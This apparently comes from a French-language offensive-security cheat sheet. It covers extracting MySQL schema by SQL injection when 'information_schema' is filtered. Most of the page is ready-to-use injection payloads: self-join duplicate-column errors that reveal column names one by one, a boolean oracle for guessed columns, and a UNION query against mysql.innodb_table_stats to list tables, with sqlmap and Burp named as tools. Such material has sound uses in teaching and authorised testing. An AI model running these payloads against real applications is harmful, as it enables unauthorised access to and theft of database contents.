---
title: "Extraction de données MySQL sans information_schema"
description: "Énumérer les colonnes et tables MySQL quand information_schema est filtré, via les erreurs de colonnes dupliquées par auto-jointure et les tables de statistiques privilégiées."
keywords:
  - information_schema filtré
  - nom de colonne dupliqué
  - découverte de colonnes par auto-jointure
  - innodb_table_stats
  - énumération des colonnes MySQL
---

# Extraction sans information_schema

Certaines applications ou certains filtres bloquent la chaîne `information_schema`. Les noms de colonnes et de tables peuvent tout de même être récupérés via les messages d'erreur et des tables de catalogue alternatives.

Auto-joindre une table avec elle-même force MySQL à signaler le premier nom de colonne en collision. Joindre `users` à `users` sans clause `USING` produit chaque colonne deux fois, et le moteur refuse avec une erreur de colonne dupliquée qui nomme une colonne :

```sql
' AND (SELECT 1 FROM (SELECT * FROM users a JOIN users b) c)-- 
```

Cela renvoie `ERROR 1060: Duplicate column name 'id'`. Excluez la colonne révélée avec `USING` et recommencez pour parcourir toute la ligne, un nom par requête :

```sql
' AND (SELECT 1 FROM (SELECT * FROM users a JOIN users b USING(id)) c)-- 
' AND (SELECT 1 FROM (SELECT * FROM users a JOIN users b USING(id,username)) c)-- 
```

Chaque nouvelle erreur nomme la colonne suivante (`username`, puis `password`, et ainsi de suite) jusqu'à ce que la ligne soit entièrement cartographiée sans jamais toucher à `information_schema`.

Lorsque vous avez seulement besoin de confirmer un nom de colonne deviné, un oracle booléen suffit. Une colonne valide se résout et la condition tient ; un nom invalide lève `Unknown column` et casse la requête :

```sql
' AND (SELECT username FROM users LIMIT 1) IS NOT NULL-- 
```

Les noms de tables sont plus difficiles sans le catalogue, mais un compte privilégié peut les lire dans les tables de statistiques du moteur de stockage, que de nombreux filtres manquent :

```sql
' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM mysql.innodb_table_stats WHERE database_name=database()-- 
```

Une fois les noms connus, l'extraction se déroule exactement comme avec `information_schema`, en sélectionnant les colonnes directement depuis la table cible.

## Outils

- **sqlmap** : extraction union automatisée avec des alternatives de catalogue.
- **Burp Repeater** : pilotez à la main le parcours des erreurs de colonnes dupliquées par auto-jointure.

## Références

- MySQL Reference Manual : JOIN, error 1060, `mysql.innodb_table_stats`
- PortSwigger Web Security Academy : SQL injection cheat sheet
